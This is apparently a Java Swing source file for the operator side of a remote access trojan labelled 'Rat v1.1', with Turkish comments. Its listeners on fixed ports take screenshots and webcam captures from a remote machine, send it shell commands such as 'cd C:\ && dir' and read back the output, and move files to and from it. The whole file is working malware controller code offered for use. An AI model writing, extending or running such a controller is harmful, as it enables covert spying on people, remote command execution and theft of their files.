import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.HierarchyEvent;
import java.awt.event.HierarchyListener;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;

import javax.swing.*;
import javax.swing.filechooser.FileSystemView;



public class server_frame extends JFrame implements ActionListener{

    public final static int FILE_SIZE = 6022386;
    private static String address = null;

    //buttons
    JButton btnScreenShot =  new JButton("ScreenShot");
    JButton btnShow = new JButton("show Text");
    JTextArea jtext = new JTextArea();
    JTextArea jtextcmd = new JTextArea();
    JButton btnsentCmd = new JButton("SEND COMMAND");
    JButton btnDownload = new JButton("Download file");
    JTextArea jtextdownload = new JTextArea();
    JTextArea jtextselect = new JTextArea();
    JTextArea jtextupload = new JTextArea();

    JButton btnSelect = new JButton("S");
    JButton btnUpload = new JButton("U");
    JButton btnWebcam = new JButton("Webcam");

    JFileChooser fc = new JFileChooser();
    Font myFont = new Font("Serif", Font.BOLD, 18);
    File selectfile;

    String command="";

    server_frame(){
        super("Rat v1.1");
        ekle();
        frame();
        setSize(500,500);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setLayout(null);
        setResizable(false);
        setVisible(true);

    }
    void ekle() {
/////////Buton ekleme\\\\\\\\
        add(btnScreenShot);
        btnScreenShot.setBounds(50,50,130,35);
        btnScreenShot.addActionListener(this);
        btnScreenShot.setFocusable(false);

        add(btnShow);
        btnShow.setBounds(50,100,130,35);
        btnShow.addActionListener(this);
        btnShow.setFocusable(false);

        add(btnsentCmd);
        btnsentCmd.setBounds(50, 150, 130, 35);
        btnsentCmd.addActionListener(this);

        add(btnDownload);
        btnDownload.setBounds(50, 255, 130, 35);
        btnDownload.addActionListener(this);
        
        add(btnSelect);
        btnSelect.setBounds(450, 308, 30, 30);
        btnSelect.addActionListener(this);
        
        add(btnUpload);
        btnUpload.setBounds(450, 358, 30, 30);
        btnUpload.addActionListener(this);
        
        add(btnWebcam);
        btnWebcam.setBounds(50, 408, 130, 35);
        btnWebcam.addActionListener(this);


////////////////Textarea\\\\\\\\\\\
        add(jtext);
        jtext.setBounds(200,105, 250, 30);

        add(jtextcmd);
        jtextcmd.setBounds(200, 155, 250, 30);

        add(jtextdownload);
        jtextdownload.setBounds(10,205,480,30);
        
        add(jtextselect);
        jtextselect.setBounds(50, 305, 390, 35);
        jtextselect.setFont(myFont);
        
        add(jtextupload);
        jtextupload.setBounds(50, 355, 390, 35);
        jtextupload.setFont(myFont);

    }
    void frame() {

        setFocusable(true);
        //setLocationRelativeTo(null);
    }

    ////////////////////get file\\\\\\\\\\\\\\\\\
    void get_file() {

        String dir = createDir();
        String file_location_and_name = CheckDirForExist(dir,"png");

        recieve_file(file_location_and_name);

    }

    void webcamshot(String dosyashotted) {
    	ServerSocket serverSocket=null;
    	Socket socket=null;
        try {
            serverSocket = new ServerSocket(1111);

            try {
                socket = serverSocket.accept();

                System.out.println("Connected");

                int current_downloaded = 0;
                int bytesRead = 0;


                // receive file
                byte[] mybytearray = new byte[FILE_SIZE];
                InputStream is = socket.getInputStream();
                FileOutputStream fos = new FileOutputStream(dosyashotted);
                BufferedOutputStream bos = new BufferedOutputStream(fos);
                bytesRead = is.read(mybytearray, 0, mybytearray.length);
                current_downloaded = bytesRead;

                do {
                    bytesRead = is.read(mybytearray, current_downloaded, (mybytearray.length - current_downloaded));
                    if (bytesRead >= 0) {
                        current_downloaded += bytesRead;
                    }

                } while (bytesRead > -1);

                fos.write(mybytearray, 0, current_downloaded);
                fos.flush();
                System.out.println("File " + dosyashotted + " downloaded (" + current_downloaded + " bytes read)");


                fos.close();
                bos.close();

                socket.close();
                serverSocket.close();

            }

            catch(IOException e) {
                System.out.println("IO EXCEPTiON");
                socket.close();
                serverSocket.close();

            }
        }
        catch(IOException e) {
            System.out.println("IO EXCEPTiON");
            try {
				socket.close();
                serverSocket.close();
			} catch (IOException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
        }
    }
    
    //////////////////////receive file with socket\\\\\\\\\\\\\\\\\\
    void recieve_file(String recieved_file_path)  {

        new Thread(new Runnable() {

            @Override
            public void run() {
                // TODO Auto-generated method stub
            	ServerSocket serverSocket=null;
            	Socket socket=null;
                try {
                    serverSocket = new ServerSocket(4444);

                    try {
                        socket = serverSocket.accept();

                        System.out.println("Connected");

                        int current_downloaded = 0;
                        int bytesRead = 0;


                        // receive file
                        byte[] mybytearray = new byte[FILE_SIZE];
                        InputStream is = socket.getInputStream();
                        FileOutputStream fos = new FileOutputStream(recieved_file_path);
                        BufferedOutputStream bos = new BufferedOutputStream(fos);
                        bytesRead = is.read(mybytearray, 0, mybytearray.length);
                        current_downloaded = bytesRead;

                        do {
                            bytesRead = is.read(mybytearray, current_downloaded, (mybytearray.length - current_downloaded));
                            if (bytesRead >= 0) {
                                current_downloaded += bytesRead;
                            }

                        } while (bytesRead > -1);

                        fos.write(mybytearray, 0, current_downloaded);
                        fos.flush();
                        System.out.println("File " + recieved_file_path + " downloaded (" + current_downloaded + " bytes read)");


                        fos.close();
                        bos.close();

                        socket.close();
                        serverSocket.close();

                    }

                    catch(IOException e) {
                        System.out.println("IO EXCEPTiON");
                        socket.close();
                        serverSocket.close();

                    }
                }
                catch(IOException e) {
                    System.out.println("IO EXCEPTiON");
                    try {
						socket.close();
	                    serverSocket.close();
					} catch (IOException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}
                }

            }
        }).start();

    }
    String createDir() {

        //default creating point is root of the program
        File folder = new File("ScreenShotsSocket");


        // if the directory does not exist, create it
        if (!folder.exists()) {
            System.out.println("creating directory: " + folder.getName());
            try{
                folder.mkdir();
                System.out.println("DIR created");
            }
            catch(SecurityException e){
                System.out.println("DIR is not created");
            }
        }

        return folder.toString();
    }

    String CheckDirForExist(String theDir, String file_type) {

        int counter = 0;

        //loop until a possible counter file name
        while(true) {

            File file = new File(theDir + File.separator + "screenshot" + counter + "." + file_type);
            if(!file.exists()) {
                return theDir + File.separator + "screenshot" + counter + "." + file_type;
            }
            else {
                counter++;
            }

        }
    }

///////////////Show Message\\\\\\\\\\\\\\\\\\\\\\\\\
    void sent() {
        new Thread(new Runnable() {

            @Override
            public void run() {
                // TODO Auto-generated method stub
            	ServerSocket serverSocket=null;
            	Socket socket=null;
                try {
                    serverSocket = new ServerSocket(4445);

                    try {
                        socket = serverSocket.accept();

                        System.out.println("Connected");

///////////////////////////Output ile text gonderilir\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ 
                        DataOutputStream dos = new DataOutputStream(socket.getOutputStream());
                        if(!jtext.getText().isEmpty())
                            dos.writeUTF(jtext.getText());
                        else
                            dos.writeUTF("HELLO");
                        System.out.println("message shown");

                        socket.close();
                        serverSocket.close();
                    }

                    catch(IOException en) {
                        JOptionPane.showMessageDialog(null, "IO EXCEPTiON on servrrrrer");
                        socket.close();
                        serverSocket.close();
                    }

                }
                catch(IOException ec) {
                    JOptionPane.showMessageDialog(null, "IO EXCEPTiON on server");
                    try {
						socket.close();
	                    serverSocket.close();

					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
                }
            }
        }).start();
    }
    void sendcmd() {
        new Thread(new Runnable() {

            @Override
            public void run() {
                ////////////////1.adim\\\\\\\\\\\\\\\\\\\\\\\
                ////////////Server sent to client\\\\\\\\\\\\\\\\\\\\\
            	ServerSocket serverSocket=null;
            	Socket socket=null;
                try {
                     serverSocket = new ServerSocket(4446);
                    System.out.println("server 4446 basladi");

                    try {
                         socket = serverSocket.accept();

                        System.out.println("Connected");

                        /////////////////////Server send to client outputstream\\\\\\\\\\\\\\\\\\\\
                        DataOutputStream dos = new DataOutputStream(socket.getOutputStream());

                        try {
                            if (jtext.getText().isEmpty())
                            	///////////////gonderilecek deger dos.writeUTF icine yazilir.
                                dos.writeUTF(jtextcmd.getText());
                            else if (!jtext.getText().isEmpty())
                                dos.writeUTF(" ");
                        } catch (Exception enj) {
                            System.out.println("catch e dustuk hacii");
                           // dos.writeUTF("cd C:\\ && dir");
                        }
                        System.out.println("message shown cmd");

                        socket.close();
                        serverSocket.close();
                    } catch (IOException en) {
                        JOptionPane.showMessageDialog(null, "IO EXCEPTiON on servrrrrer");

                    }

                } catch (IOException ec) {
                    JOptionPane.showMessageDialog(null, "IO EXCEPTiON on server");
                }


                /////////////////////////////////2.Adim\

                try {
                   
                   // Socket socket=null;;
                    serverSocket = new ServerSocket(4447);
                    System.out.println("Server Started and listening to the port 4447");

                    //Server is running always. This is done using this while(true) loop

                    //Reading the message from the client
                    socket = serverSocket.accept();
                    /////////Clienttan gelen degeri geri okumak icin Inputstream kullanilir\\\\\\\\\\\\\\
                    InputStream is = socket.getInputStream();
                    InputStreamReader isr = new InputStreamReader(is);
                    BufferedReader br = new BufferedReader(isr);
                    String line;
                    StringBuilder builder = new StringBuilder();
                    while ((line = br.readLine()) != null) {
                        builder = builder.append(line + "\n");
                    }

                    // line = br.readLine();
                    String a = builder.toString();
                    System.out.println(a);
                    br.close();
                    JOptionPane.showMessageDialog(new JScrollPane(), a);

                    socket.close();
                    serverSocket.close();
                } catch (Exception en) {
                	try {
                    	socket.close();
						serverSocket.close();
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
                    en.printStackTrace();
                }


            }
        }).start();
    }

    void sendcmd2() {

                ////////////////1.adim\\\\\\\\\\\\\\\\\\\\\\\
                ////////////Server sent to client\\\\\\\\\\\\\\\\\\\\\
    	ServerSocket serverSocket = null;
                try {
                    serverSocket = new ServerSocket(4448);
                    System.out.println("server 4448 basladi");

                    try {
                        Socket socket = serverSocket.accept();

                        System.out.println("Connected");

                        /////////////////////Indirilecek dosya output ile clienta komut gonderilir\\\\\\\\\\\\\\\
                        DataOutputStream dos = new DataOutputStream(socket.getOutputStream());

                        try {
                            if (jtext.getText().isEmpty())
                                dos.writeUTF(jtextdownload.getText());
                            else if (!jtextdownload.getText().isEmpty())
                                dos.writeUTF("cd C:\\ && dir");
                        } catch (Exception enj) {
                            System.out.println("catch e dustuk hacii");
                            //dos.writeUTF("cd C:\\ && dir");
                        }
                        System.out.println("message shown cmd2");

                        socket.close();
                        serverSocket.close();
                    } catch (IOException en) {
                        JOptionPane.showMessageDialog(null, "IO EXCEPTiON on servrrrrer");

                    }
                   // socket.close();
                    serverSocket.close();
                    
                } catch (IOException ec) {
                	try {
						serverSocket.close();
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}

                    JOptionPane.showMessageDialog(null, "IO EXCEPTiON on server");
                }


                /////////////////////////////////2.Adim\
        int bytesRead;
        int current = 0;
        ///////////////////Gonderilen komuta karsilik komut calistirilir ve ciktisi client tarafindan socket ile gonderilir\\\\\\\\\\\\
        Socket clientSocket = null;
        
        try {
                    //String line;
                    //StringBuilder builder = new StringBuilder();
                    //int port = 4449;
                   // Socket clientSocket;
                    serverSocket = new ServerSocket(1337);
                   // socket = serverSocket.accept();
                    System.out.println("Server Started and listening to the port 4449");
                    clientSocket = serverSocket.accept();

                    ///while(true) {
                        //Socket clientSocket = null;

                    createDirr();
                    /////////////Send file using inputstram\\\\\\\\\\\
                    InputStream in = clientSocket.getInputStream();

                        //address = clientSocket.getLocalAddress().toString();

                        DataInputStream clientData = new DataInputStream(in);
                        // System.out.println();
                        String path = "Downloads"+File.separator;
                        try {
                        String fileName = clientData.readUTF();
                        
                        OutputStream output = new FileOutputStream(path+fileName);
                        long size = clientData.readLong();
                        byte[] buffer = new byte[1024];
                        while (size > 0 && (bytesRead = clientData.read(buffer, 0, (int)Math.min(buffer.length, size))) != -1)
                        {
                            output.write(buffer, 0, bytesRead);
                            size -= bytesRead;
                        }
                        
                        // Closing the FileOutputStream handle
                    clientData.close();
                    clientSocket.close();
                    in.close();
                        output.close();
                        serverSocket.close();

                   // }

                        }catch(EOFException eof) {
                        	System.out.println("eof error");
                        }
                } catch (FileNotFoundException | SocketException f) {
                	try {
                	clientSocket.close();
						serverSocket.close();
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
                    f.printStackTrace();
                    
                } catch (IOException e) {
                    e.printStackTrace();
                }

    }
    static String createDirr() {
        //default creating point is root of the program
        File folder = new File("Downloads");

        // if the directory does not exist, create it
        if (!folder.exists()) {
            System.out.println("creating directory: " + folder.getName());
            try{
                folder.mkdir();
                System.out.println("DIR created");
            }
            catch(SecurityException e){
                System.out.println("DIR is not created");
            }
        }
        return folder.toString();
    }
    
    void selectfile() {
    	try {
            ServerSocket serverSocket = new ServerSocket(4450);
            System.out.println("server 4450 basladi");

            try {
                Socket socket = serverSocket.accept();

                System.out.println("Connected");


                DataOutputStream dos = new DataOutputStream(socket.getOutputStream());

                try {
                        dos.writeUTF(selectfile.toString());
                   
                } catch (Exception enj) {
                    System.out.println("catch e dustuk hacii");
                   // dos.writeUTF("cd C:\\ && dir");
                }
                System.out.println("message shown cmd");

                socket.close();
                serverSocket.close();
            } catch (IOException en) {
                JOptionPane.showMessageDialog(null, "IO EXCEPTiON on servrrrrer");

            }

        } catch (IOException ec) {
            JOptionPane.showMessageDialog(null, "IO EXCEPTiON on server");
        }
    }
    
    private ServerSocket serv;
    private Socket client;
    private File myFile;

    public void Server(int port, String fileName) throws IOException
    {
    	try {
        serv = new ServerSocket(port);
        myFile = new File (fileName);

        while(true)
        {
            //wait for Connection
            System.out.println("Waiting for connection on port "+port);
            client=serv.accept();
            sendFile();
            serv.close();
            client.close();
        }
    	}catch (IOException e) {
    		try {
				serv.close();
			} catch (IOException e1) {
				// TODO Auto-generated catch block
	    		client.close();
				e1.printStackTrace();
			}
			// TODO: handle exception
		}
    }

    public void sendFile() throws IOException
    {

        if (!myFile.exists()) {
            System.out.println("File doesn not exist!");
            System.exit(-1);
        }

        //file do exist

        System.out.println("AbsolutePath:" + myFile.getAbsolutePath());
        System.out.println("length: " + myFile.length());

        if (myFile.exists()) {
            ObjectOutputStream oos=new ObjectOutputStream(client.getOutputStream());

            oos.writeObject(myFile);
        }


    }
    
    void calistir() throws IOException {
    	
    	ServerSocket serverSocket = null;
    	 try {
             serverSocket = new ServerSocket(9998);
             System.out.println("server 4448 basladi");

             try {
                 Socket socket = serverSocket.accept();

                 System.out.println("Connected");

                 /////////////////////Indirilecek dosya output ile clienta komut gonderilir\\\\\\\\\\\\\\\
                 DataOutputStream dos = new DataOutputStream(socket.getOutputStream());

                 try {
                     if (jtext.getText().isEmpty())
                         dos.writeUTF(jtextupload.getText());
                     else if (!jtextupload.getText().isEmpty())
                    	 System.out.println("wrong info");
                        // dos.writeUTF("cd C:\\ && dir");
                 } catch (Exception enj) {
                     System.out.println("catch e dustuk hacii");
                     dos.writeUTF("cd C:\\ && dir");
                 }
                 System.out.println("message shown cmd2");

                 socket.close();
                 serverSocket.close();
             } catch (IOException en) {
                 JOptionPane.showMessageDialog(null, "IO EXCEPTiON on servrrrrer");

             }
            // socket.close();
             serverSocket.close();
         } catch (IOException ec) {
        	 serverSocket.close();
             JOptionPane.showMessageDialog(null, "IO EXCEPTiON on server");
         }
    	
    	 int port = 9999;


         Server(port, selectfile.toString());
    }
    
    @Override
    public void actionPerformed(ActionEvent e) {
        if(e.getSource() == btnScreenShot) {
            get_file();
        }
        if(e.getSource() == btnShow) {

            sent();
        }
        if(e.getSource() == btnsentCmd) {
            sendcmd();
        }
        if (e.getSource() == btnDownload) {
        sendcmd2();
        }
        if(e.getSource() == btnSelect) {
        	//selectfile();
        	fc.showOpenDialog(server_frame.this);
        	selectfile = fc.getSelectedFile();
        	System.out.println(selectfile.toString());
        	jtextselect.setText(selectfile.toString());
        }
        if(e.getSource() == btnUpload) {
        	try {
				calistir();
			} catch (IOException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
        }
        if(e.getSource() == btnWebcam) {
        	webcamshot("a.png");
        }

    }

}